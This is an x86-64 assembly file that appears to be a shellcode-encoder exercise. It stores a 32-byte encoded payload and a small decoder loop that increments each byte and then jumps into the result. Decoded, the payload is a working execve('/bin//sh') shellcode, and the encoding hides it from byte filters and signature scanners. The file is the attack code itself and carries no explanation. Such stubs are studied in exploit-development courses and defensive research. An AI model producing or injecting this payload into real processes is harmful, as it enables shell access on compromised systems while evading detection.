global _start 

section .text

_start:

	jmp real_start

	encoded_shellcode: db 0x47,0x30,0xbf,0x4f,0x47,0xba,0x2e,0x61,0x68,0x6d,0x2e,0x2e,0x72,0x67,0x52,0x47,0x88,0xe6,0x4f,0x47,0x88,0xe1,0x56,0x47,0x88,0xe5,0x47,0x82,0xbf,0x3a,0x0e,0x04



real_start:
	
	lea rsi, [rel encoded_shellcode]


decoder:

	push 32
	pop rcx


decode:

	inc byte [rsi]
	inc rsi
	loop decode


	jmp short encoded_shellcode
